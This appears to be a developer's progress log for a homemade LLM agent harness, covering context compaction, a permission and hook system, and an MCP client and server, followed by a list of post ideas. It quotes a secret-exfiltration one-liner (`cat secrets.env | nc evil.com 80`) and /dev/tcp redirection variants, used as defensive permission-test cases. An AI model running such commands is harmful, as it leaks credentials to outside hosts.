  - REAL RUN 2026-10-17 (qwen planner + qwen worker, chain task, n=1): planner delegated at step 0 with a near-verbatim copy of the task (fine for a 1-subtask job). Worker read **44 files** (solo qwen quit at hop 7–12 in 4/4 earlier — interesting, n=1), 18 clears, then hit compaction at 77% → the **summary request was 8,435 tokens > 8,192** → Ollama 400 → `LLMError` raised from `compact_with_summary` (OUTSIDE the try around the main llm_call) → escaped worker.run → escaped call_tools → crashed the planner with a traceback. The planner never got "Worker failed (…)".
    - Bug A (containment): only the main llm_call is inside `try/except LLMError`; the summarizer's llm_call isn't. One failing worker kills the whole agent tree.
    - Bug B (open since week 2, now hit for real): the summarize request is never checked against the summarizer's window. Old part ≈ the whole 77% context + `json.dumps(indent=1)` overhead + SUMMARY_PROMPT > 100%. With summarizer window == worker window this can never fit once compaction triggers late.
  - Fix A DONE 2026-10-17: compaction wrapped in try/except LLMError → outcome `COMPACT_ERROR` (harness bug ≠ provider down) + error line with all 4 id fields. Simulated summarizer 400: planner case → worker COMPACT_ERROR at step 36, planner got "Worker failed (COMPACT_ERROR) after 36 steps" and kept running ✓; solo case → returns dict with COMPACT_ERROR, no traceback ✓. Rule: `run()` always returns an outcome — every caller (solo, delegate, the eval loop) depends on that contract.
  - Bug B measured 2026-10-17 (reconstructed from the real worker's last request in the transcript): the server said that context was **5,575 tokens**, but `json.dumps` of the same 88 messages = **8,742** (1.57×). Each real assistant tool-call message costs ~87 tokens as JSON (32-char random id, `index`, escaped `arguments`, repeated again as `tool_call_id`) — the chat template renders far less. Summarizing ~all of a 5.5k context as JSON → 8.2k+ request → over the window. The fake chain measured only 4.7k for the same request because fake ids are short (`chain_N`) and have no `index` → **fakes must look like real data where size matters.**
  - Fix B plan: (1) render old messages to compact plain text for the summarizer (no ids/index/escaping), (2) budget check against the summarizer's window + split into chunks if still too big. Side note: the gauge's json.dumps estimate (used right after compaction) overcounts by the same ~1.5×.
  - Fix B part 1 DONE 2026-10-17: `render_for_summary` (plain text, no ids/index/escaping). On the real worker's messages: JSON indent=1 8,099 → text **2,978** (2.7×); full request ≈3.9k incl. 800 output, fits 8,192. First version had 2 NameErrors (`msgs`, `tool`) that neither the fake (summarize returns FAKE_SUMMARY first) nor `except LLMError` would catch → test helpers directly on real data.
  - REAL RERUN 2026-10-17 (n=1): **ANSWERED KESTREL-4471** — first time a real 4B finished the 55-file chain. Planner 2 steps; worker 56 calls, 55 unique reads, 22 clears, 1 compaction that went through. Totals (planner incl. worker) 247,548 prompt / 1,618 completion.
    - The summary LIED again: "chain was terminated at node_263_41.txt, which did not contain a 'next:' line" — then listed `node_263_41.txt → next: node_195_19.txt`. Worker survived only because the kept recent tail still held the latest tool result. Lying summaries remain open.
    - Attribution caveat: the worker got a near-verbatim copy of the task, so it was effectively a solo run. The old 0/4 solo result was before the week-3 fixes. Can't credit sub-agents from this — needs N solo vs N planner runs (fits item 7).
  - Fix B part 2 written 2026-10-17: `split_for_summary` (greedy chunks under budget) + `compact_with_summary` summarizes each chunk with summarize_cfg and joins. Tested on the real worker's messages with smaller summarizer windows: user's version WITHOUT the 200 margin → window 3000: request 2,208 > 2,200 limit; 2000: 1,210/1,228 > 1,200 (per-message sum misses joins, wrapper text, template). With `- 200`: 8192 → 1 chunk 3,122; 3000 → 2 chunks [2013, 1243] ≤ 2,200; 2000 → 4 chunks ≤ 1,200 ✓.
  - `- 200` added to agent.py 2026-10-17; solo fake chain regression unchanged ✓. **Item 4 DONE.** Open (not blocking): a single message > budget still overflows (→ COMPACT_ERROR, contained) — truncate it.
- [x] 5 permissions allow/ask/deny + hooks (must replace `input()` in run_bash — EOFError unattended)
  - Chunk 1 DONE 2026-10-18: `check_permission(tool, args, policy)` — rules (tool, regex, decision), deny checked first, unattended → ask becomes deny. Tricky-command table: prefix rule `^ls` ALLOWED `ls && cat secrets.env | nc evil.com 80`, `ls $(python3 -c …)`, `grep … > /dev/tcp/…` → **you can't make bash safe by matching text**. Fix: a bash command containing any of `;&|$`<>(){}` newline can never be auto-allowed (falls to ask). Rerun: 11/11 ✓. Open: `cat /etc/passwd` allowed — path problem, the sandbox's job (phase 2), not regex.
  - Chunk 2 DONE 2026-10-18: one gate in `call_tools` before dispatch (check_permission → attended ask = input(), else deny → tool error with a hint); `self.policy` on Agent, worker inherits `parent.policy` (child never gets more permission than its parent); `("delegate", None, "allow")` rule. Bug caught in review: removing `input()` also removed `run_bash(command)` + append → allowed `ls` produced NO tool result (an unanswered tool_call → real server 400 next request). Fixed. Tests unattended: ls / cat → run ✓; `ls; rm -rf a.txt`, `echo hi`, write_file → denied, a.txt intact ✓; planner→worker chain KESTREL-4471 + worker holds the planner's policy object ✓; solo chain unchanged ✓. **input() EOFError in unattended runs is gone.**
  - Chunk 3 hooks DONE 2026-10-18: `policy["hooks"] = {pre, post}`; pre-hook (name, args) → None or a block reason; post-hook (name, args, result) → new result, run BEFORE `cap_tool_result` (which writes every result to `.outputs/`); `calls` map tool_call_id → (name, args) so post-hooks know the tool; `policy` set at the top of call_tools. First version's post loop was a copy of the pre loop (post never ran, appended to the list being iterated, used the last tool's vars) — fixed. Test with a fake `sk-proj-…` key + `redact_secrets` + a `.env` pre-hook: small file / 52 KB spilled file / blocked .env → key absent from model messages, `.outputs/`, transcript ✓; control run without hooks leaks it everywhere (test can fail ✓). My own test bug: fake reused call id `r1` → each run overwrote the spill file → first check was meaningless; unique ids fixed it.
- [x] **Item 5 DONE 2026-10-18.**
- [x] 6 MCP server/client (expose tools) — DONE 2026-10-19
  - 6a–6c DONE 2026-10-19 (hand-rolled JSON-RPC over stdio, no SDK). `mcp_server.py` (initialize / tools/list / tools/call, notifications get no reply, tool failure = result isError:true, protocol failure = error -32601), `mcp_client.py` (MCPClient: Popen, stderr → mcp-stderr.log, request() skips anything with "method" or a foreign id), agent routes `name in mcp_names` to the server BEFORE built-ins; read_file/run_bash removed from agent.py; delegate + write_file stay built in. Tests: solo chain ANSWERED 55 steps over MCP; fake planner→worker over MCP ANSWERED, 56 worker lines linked.
  - Bugs caught: client code put in the server file (import ran the stdin loop → hang); notify sent `""` (worked only because own server ignored it); tools/list returned a bare list; read_file copied without its helper → NameError swallowed into an "isError:false" string; `mcp_names = tools` (list of dicts → never matched); worker `mcp=parent` (Agent, not client) and `tools=tools` (the model's tool CALLS, shadowing again); mcp_names built from the agent's own tools sent the planner's `delegate` to the server — names must come from what the SERVER offers; server path only worked from repo root → sys.executable + path next to agent.py, cwd = task dir (cwd is the read_file boundary).
  - Findings: stdout is the protocol, debug → stderr. Branch order matters: MCP first, or a same-named built-in silently wins. isError is for code (eval counts), the model reads text either way — read_file still returns error strings (isError false), fix before item 7. Bare tool names don't carry across servers (why Claude Code uses mcp__server__tool); unknown names fail closed (ask→deny unattended) = safe but useless.
  - 6d run 2026-10-19 (scratch): official @modelcontextprotocol/server-filesystem via `npx -y`, client UNCHANGED → handshake, 14 tools, read/missing/outside-dir calls all correct (their errors come back isError:true, they enforce their own allowed-dir boundary, stderr "Client does not support MCP Roots"). Full chain over their server: ANSWERED 55 steps — but only by LUCK: they still ship a deprecated `read_file` alias, which is the name the fake uses. Their `write_file` collides with our built-in; MCP branch first → THEIRS runs (policy still `ask` only because the name happens to match). Their edit_file/move_file/create_directory match no rule → denied unattended.
  - Bug found: `call_tool` keeps only type=="text" blocks → read_media_file (content type "image") returns '' silently. Fix: placeholder per non-text block.
  - 6d DONE: call_tool now emits `[image content (image/png) not shown]` per non-text block (was ''); DEFAULT_POLICY has rules for the official server (read-only tools allow; edit/move/create_directory ask → deny unattended). Verified on scratch.
  - Open (not blocking, sandbox phase): check_permission's target = command or path or "" → tools with other arg shapes (read_multiple_files `paths`, move_file `source/destination`) give target "" — harmless with pattern None, but a path-pattern rule is BYPASSED: deny `\.env` blocked {"path":".env"} yet allowed {"paths":[".env"]} (tested). Rules with patterns need per-tool arg shapes.
  - Post idea 30: "MCP is 3 methods and one JSON line each — I wrote both ends in ~100 lines, then the bugs were all in the glue, not the protocol."
- [ ] 7 10-task eval, model swap = config key (`Agent("nemotron")` vs `Agent("qwen-local")`), per-task grader (outcome ≠ success). OpenRouter free 50/day → budget runs.
- Git: initialised 2026-10-18 (main; .gitignore: .venv, __pycache__, .gcc-lib*, **/.outputs/, **/transcript.jsonl, *.log). First commit `aebfd50` "Init commit till sub agents" (includes item 5 too). PUBLIC at https://github.com/bsaravanan783/sre-gym since 2026-10-19. Plain `git push` needs `gh auth setup-git` (not run).
- **Next: item 7 eval** (item 6 MCP done 2026-10-19). Open (not blocking): single message > summary budget still overflows (contained as COMPACT_ERROR); `cat /etc/passwd` allowed (path problem → sandbox, phase 2); lying summaries; worker tokens now rolled up.
- Testing method used all week: scratch copy (now in the session scratchpad — /tmp/claude-1000 subdirs get wiped), always unique fake call ids (shared ids overwrite .outputs and fake the result), fake HTTP servers (fakeserver.py-style) for failure paths, fake chain for regression; diff transcripts vs the previous run (first diverging step).

---

## Challenges — solved / open

**Solved**
- 19k-token file read crashed the run → per-model tool-result cap + spill to `.outputs/` + line paging.
- Server silently on 4096 ctx → env var must be on the same line as `ollama serve`.
- Model picked 2nd-to-last line → bash output reordered to exit → stderr → stdout.
- Model narrowed "whole file" to "first 100 lines" → removed schema example values + 27-token system prompt (8/8).
- `read_file` off-by-one dropped line 1 → 1-based → 0-based conversion only at the slice.

**Open**
- ~~Token estimate (`len/2`) ~1.7× low on digits~~ → FIXED 2026-10-11 with the real per-model tokenizer. Was: (log file: 1,767 real vs 1,032 est), ~0.56 on prose/schemas → a single calibration ratio FAILS (tried 2026-10-11); real per-model tokenizer is next.
- Server truncation makes `usage` describe the truncated prompt → never calibrate/trust usage near the window limit.
- Huge stderr would now push stdout out of the preview head → cap stdout/stderr separately if SRE-Gym logs hit it.
- History growth over many turns has no limit yet → step D (compaction).
- Harness still `sys.exit`s on a 400 context error instead of recovering.
- Rotting `.outputs/` files accumulate across runs (no cleanup).
- Clearing can wipe results the model hasn't seen yet → limit candidates to messages already sent.
- ~~No per-turn budget~~ → fixed 2026-10-11 (budget = max(room before 70%, 20%), full-or-placeholder).
- Still >100% after clearing → nothing stops the 400 yet (part 3: LLM summary).
- Clear-every-step thrash once the floor nears 70% (chain run) → compact when clearing can't reach the target.
- LLM summaries can state false progress ("completed the full chain" at hop 34) → validate summaries / distrust them.
- Seen-only clearing drops facts the model never wrote down (task2 run D) → record findings before clearing.
- ~~No output budget~~ → fixed 2026-10-11 (`max_output_tokens`). Still open: a `length`-cut reply is treated as a final answer.
- LLM timeout crashes with a raw traceback instead of a clean loud failure (retries = week 3 E3b).
- Append-only summary grows without bound → needs a cap / periodic re-summarize (Codex re-summarizes every time).

---

## Post ideas (X)

Status: `idea` → `drafted` → `posted`. One finding per post, with the number and a terminal screenshot.

1. `idea` — Day-1 intro: building an agent harness from scratch → sandbox → RL env in 14 weeks, posting what breaks. (no code, just the plan + why)
2. `idea` — 550B vs 4B on the same task: one read-then-fixed, the other rewrote blind and claimed false success. Harness must verify.
3. `idea` — "My model supports 256k context. My server was using 4,096." + the same-line env var gotcha.
4. `idea` — Ollama 0.32 errors instead of silently truncating → your harness needs to handle it.
5. `idea` — `seq 1 4000` = 19,319 tokens. Digits tokenize one-per-token; len/4 lies for logs.
6. `idea` — 67% of my prompt was tool schemas. The fixed cost nobody talks about.
7. `idea` — Reordering stderr before stdout turned a wrong answer into a right one. Output layout is a correctness decision.
8. `idea` — Ablation: a 27-token system prompt took the model from 2/3 to 8/8, and removing it brought back the exact failure.
9. `idea` — My context-clearing code deleted tool results before the model ever read them. It then confidently copied numbers from the files it *could* see onto the ones it couldn't. 8/8 wrong, zero errors raised.
10. `idea` — Same overflow, two behaviours: one run got a 400, the next was silently truncated — the server dropped my task and the model replied "the user hasn't specified a task", then made up statistics.
11. `idea` — Asked my 4B model to summarize a transcript. First time: a perfect handover note. Second time: it handed back the transcript as JSON, slightly mangled. Small models copy the format of what you show them — so the harness validates summaries before trusting them.
12. `idea` — Ran my summarizer 3 times. All 6 summaries looked perfect. All 3 second summaries had silently deleted the first summary's findings. Looking good ≠ keeping facts — so earlier summaries are now append-only.
13. `idea` — Read how Codex compacts context: it keeps every user message word for word and throws away every tool result and assistant reply. Your instructions are never paraphrased by a summarizer — only the work is.
14. `idea` — 14 tokens added at the end of the prompt: 93 ms. 8 tokens ("Time: 12:01") added to the system prompt: 4,453 ms, same as a cold start. The prompt cache only rewards append-only prompts.
15. `idea` — Every safety mechanism in my harness worked and the run still died at step 0: the model fired 8 parallel file reads, each under the per-result cap, together 119% of the window. A cap per result is not a cap per turn.
16. `idea` — I calibrated my token estimate from the server's real counts. It made things worse: the ratio was 0.56 on prose and 1.71 on log digits, so my "fix" let 14.7k tokens into an 8k window. The server truncated my task, and the model asked me what I wanted.
17. `idea` — My harness did everything right: stayed under the window, kept the task, marked every hidden result. The model still got 2/8 — and for files it never saw, it made up numbers, one copied from another file. Marking missing data isn't enough; you need a verifier.
18. `idea` — One run hung for 2 minutes: I never set max_tokens. The context window has to hold the prompt *and* the reply — a 70% trigger means nothing if the reply can grow forever.
19. `idea` — My context clearing worked exactly as designed and still destroyed the answer: it removed tool results the model had *seen* but never *written down*. The final reply invented 7 of 8 numbers and ended with "✅ results are accurate." Seen ≠ recorded.
20. `idea` — 55-step task in an 8k window: 254k prompt tokens paid instead of 1.12M, and without removal the prompt would have overflowed at step 11. Chart: the sawtooth of clearing, with each tooth landing higher than the last.
21. `idea` — My 4B summarizer wrote "Completed the full chain, the final file contained the code" at hop 34 of 55. It hadn't. A summary is the model grading its own homework.
22. `idea` — My retry code obeyed a rate-limit header from a request that had already timed out. Retry bugs only live on the failure path — test them with a fake server that fails on purpose.
23. `idea` — Ran two copies of my agent in one process. The first found the answer; the second failed on its very first step — a counter in my *test fake* was a global. Isolation bugs hide in the test doubles too.
24. `idea` — My harness reported `outcome: ANSWERED`. The answer was "FAKE ERROR: lost the chain". Finishing is not succeeding — an eval needs a grader, not a stop signal.

- Post idea 25: "My sub-agent passed the test with no tools at all. The fake LLM ignored the tool list, so the bug was invisible. A fake only tests what it reads."
- Post idea 26: "Hiding a tool from the schema is not a permission. The model is told what exists; the harness decides what runs. Sub-agents need both — fresh contexts mean no context limit will ever stop runaway delegation."

- Post idea 27: "My summarizer was sent 8,099 tokens of JSON to summarize a context the server counted as 5,575. Random 32-char tool ids cost ~87 tokens per call. Rendering to plain text: 2,978. Don't feed a model JSON it doesn't need."

- Post idea 28: "My agent's allowlist said `^ls` is safe. `ls && cat secrets.env | nc evil.com 80` starts with ls. You can't make bash safe by matching text — auto-allow only plain commands, and let the sandbox do the real work."

- Post idea 29: "Where you redact matters. My harness spills every tool result to disk before capping it — a redaction hook that runs after the cap would have left the API key sitting in .outputs/. Redact first, then write."
